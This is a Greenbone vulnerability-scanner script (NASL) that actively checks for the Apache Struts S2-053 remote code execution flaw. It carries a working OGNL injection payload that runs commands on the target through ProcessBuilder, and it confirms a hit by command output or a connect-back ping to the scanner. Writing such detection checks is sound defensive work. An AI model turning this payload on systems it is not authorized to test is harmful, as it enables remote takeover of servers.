# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.108243");
  script_version("2024-11-13T05:05:39+0000");
  script_cve_id("CVE-2017-12611");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2024-11-13 05:05:39 +0000 (Wed, 13 Nov 2024)");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2019-08-12 21:15:00 +0000 (Mon, 12 Aug 2019)");
  script_tag(name:"creation_date", value:"2017-09-11 12:00:00 +0200 (Mon, 11 Sep 2017)");
  script_name("Apache Struts Security Update (S2-053) - Active Check");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl",
                      "DDI_Directory_Scanner.nasl", "os_detection.nasl",
                      "global_settings.nasl");
  script_require_ports("Services/www", 8080);
  script_exclude_keys("Settings/disable_cgi_scanning",
                      "global_settings/disable_generic_webapp_scanning");

  script_xref(name:"URL", value:"https://cwiki.apache.org/confluence/display/WW/S2-053");
  script_xref(name:"URL", value:"https://cwiki.apache.org/confluence/display/WW/S2-058");
  script_xref(name:"Advisory-ID", value:"S2-053");
  script_xref(name:"Advisory-ID", value:"S2-058");

  script_tag(name:"summary", value:"Apache Struts is prone to a remote code execution
  (RCE) vulnerability.");

  script_tag(name:"vuldetect", value:"Two different methods are used:

  1. Sends a crafted HTTP GET request and checks the response.

  2. Sends a crafted HTTP GET request and checks if the target is connecting back to the scanner
  host.

  Notes:

  - For a successful detection of this flaw via the second method the scanner host needs to be able
  to directly receive ICMP echo requests from the target.

  - This script needs to check every parameter of a web application with various crafted requests.
  This is a time-consuming process and this script won't run by default. If you want to check for
  this vulnerability please enable 'Enable generic web application scanning' within the script
  preferences of the VT 'Global variable settings (OID: 1.3.6.1.4.1.25623.1.0.12288)'.");

  script_tag(name:"impact", value:"Successfully exploiting this issue may allow an attacker to
  execute arbitrary code in the context of the affected application.");

  script_tag(name:"affected", value:"Apache Struts 2.0.0 through 2.3.33 and 2.5 through 2.5.10.1.");

  script_tag(name:"solution", value:"Update to version 2.3.34, 2.5.12 or later.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

# nb: We also don't want to run if optimize_test is set to "no"
if( get_kb_item( "global_settings/disable_generic_webapp_scanning" ) )
  exit( 0 );

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("misc_func.inc");
include("host_details.inc");
include("os_func.inc");
include("url_func.inc");
include("dump.inc");
include("list_array_func.inc");
include("pcap_func.inc");

ownip = this_host();
targetip = get_host_ip();

# nb: No need to run against a GOS / GSM as we know that the system isn't using Struts at all and
# thus waste scanning time on self scans.
if( executed_on_gos() ) {
  if( ownip == targetip || islocalhost() ) {
    exit( 99 ); # EXIT_NOTVULN
  }
}

port = http_get_port( default:8080 );
host = http_host_name( dont_add_port:TRUE );

if( ! cgis = http_get_kb_cgis( port:port, host:host ) )
  exit( 0 );

foreach cgi( cgis ) {

  cgiArray = split( cgi, sep:" ", keep:FALSE );

  cmds = exploit_commands();

  foreach cmd( keys( cmds ) ) {

    c = "{'" + cmds[ cmd ] + "'}";

    ex = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):" +
         "((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com." +
         "opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses()." +
         "clear()).(#context.setMemberAccess(#dm)))).(#p=new java.lang.ProcessBuilder(" + c + "))." +
         "(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}";

    urls = http_create_exploit_req( cgiArray:cgiArray, ex:urlencode( str:ex ) );
    foreach url( urls ) {

      req = http_get_req( port:port, url:url );
      buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

      if( egrep( pattern:cmd, string:buf ) ) {
        report = 'It was possible to execute the command `' + cmds[ cmd ] + '` on the remote host.\n\nRequest:\n\n' + req + '\n\nResponse:\n\n' + buf;
        security_message( port:port, data:report );
        exit( 0 );
      }
    }
  }
}

# nb: Always keep open_sock_tcp() after the first call of a function forking on multiple hostnames /
# vhosts (e.g. http_get(), http_post_put_req(), http_host_name(), get_host_name(), ...). Reason: If
# the fork would be done after calling open_sock_tcp() the child's would share the same socket
# causing race conditions and similar.
#
# In this case we have already called http_host_name() so this can be kept here.
if( ! soc = open_sock_tcp( port ) )
  exit( 0 );

ownhostname = this_host_name();
ownip = this_host();
src_filter = pcap_src_ip_filter_from_hostnames();
dst_filter = string( "(dst host ", ownip, " or dst host ", ownhostname, ")" );
filter = string( "icmp and icmp[0] = 8 and ", src_filter, " and ", dst_filter );

if( os_host_runs( "Windows") == "yes" )
  target_runs_windows = TRUE;

foreach cgi( cgis ) {

  foreach connect_back_target( make_list( ownip, ownhostname ) ) {

    if( target_runs_windows ) {
      cleancmd = "ping -n 3 " + connect_back_target;
      pingcmd = '"ping","-n","3","' + connect_back_target + '"';
    } else {
      vtstrings = get_vt_strings();
      check = vtstrings["ping_string"];
      pattern = hexstr( check );
      cleancmd = "ping -c 3 -p " + pattern + " " + connect_back_target;
      pingcmd = '"ping","-c","3","-p","' + pattern + '","' + connect_back_target + '"';
    }

    c = "{" + pingcmd + "}";

    ex = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):" +
         "((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com." +
         "opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses()." +
         "clear()).(#context.setMemberAccess(#dm)))).(#p=new java.lang.ProcessBuilder(" + c + "))." +
         "(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}";

    cgiArray = split( cgi, sep:" ", keep:FALSE );

    urls = http_create_exploit_req( cgiArray:cgiArray, ex:urlencode( str:ex ) );
    foreach url( urls ) {

      req = http_get_req( port:port, url:url );

      res = send_capture( socket:soc, data:req, timeout:5, pcap_filter:filter );
      if( ! res )
        continue;

      type = get_icmp_element( icmp:res, element:"icmp_type" );
      if( ! type || type != 8 )
        continue;

      # nb: If understanding https://datatracker.ietf.org/doc/html/rfc792 correctly the "data" field
      # should be always there. In addition at least standard Linux and Windows systems are always
      # sending data so it should be safe to check this here.
      if( ! data = get_icmp_element( icmp:res, element:"data" ) )
        continue;

      if( ( target_runs_windows || check >< data ) ) {
        close( soc );
        report = http_report_vuln_url( port:port, url:url );
        report += '\n\nIt was possible to execute the command `' + cleancmd + '` on the remote host.\n\nRequest:\n\n' + req + '\n\nReceived answer (ICMP "Data" field):\n\n' + hexdump( ddata:data );
        security_message( port:port, data:report );
        exit( 0 );
      }
    }
  }
}

close( soc );

# nb: Don't use exit(99); as we can't be sure that the target isn't affected if e.g. the scanner
# host isn't reachable by the target host or another IP is responding from our request.
exit( 0 );
